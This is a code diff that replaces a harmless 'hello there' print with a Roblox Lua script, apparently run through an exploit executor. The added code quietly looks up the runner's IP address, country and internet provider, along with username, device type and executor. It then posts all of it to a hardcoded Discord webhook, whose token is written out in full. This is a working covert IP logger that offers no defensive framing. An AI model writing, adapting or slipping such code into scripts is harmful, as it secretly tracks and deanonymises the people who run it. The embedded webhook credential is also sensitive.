@@ -1,1 +1,48 @@
-print("hello there")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+
+local Player = Players.LocalPlayer
+local Executor = identifyexecutor and identifyexecutor() or "Unknown"
+
+-- Safe http req
+local function SafeHttpGet(url)
+    local success, result = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet(url))
+    end)
+    return success and result or nil
+end
+
+-- ip log
+local ipInfo = SafeHttpGet("https://ipwho.is/") or {}
+local ip = ipInfo.ip or "idk"
+local country = ipInfo.country or "idk"
+local provider = ipInfo.connection and ipInfo.connection.isp or "idk"
+
+-- device
+local platform = "idk"
+if UserInputService.TouchEnabled then
+    platform = "Mobile"
+elseif UserInputService.KeyboardEnabled then
+    platform = "PC"
+end
+
+-- info save
+local data = {
+    ["embeds"] = {{
+        ["title"] = "Execute logged",
+        ["description"] = string.format(
+            "**Username:** %s\n**Device:** %s\n**Executor:** %s\n**IP:** %s\n**Country:** %s\n**wifi prov:** %s",
+            Player.Name, platform, Executor, ip, country, provider
+        ),
+        ["color"] = 16711680 -- red
+    }}
+}
+
+-- webhook send
+request({
+    Url = "https://discord.com/api/webhooks/1482426073605210344/Km54sYalO8xFlbeIBUEkjEhB6WYCDcbxsAWyhkSfWrD8OYzHZk1NEJAZoykfkMvh5Rwm",
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = HttpService:JSONEncode(data)
+})
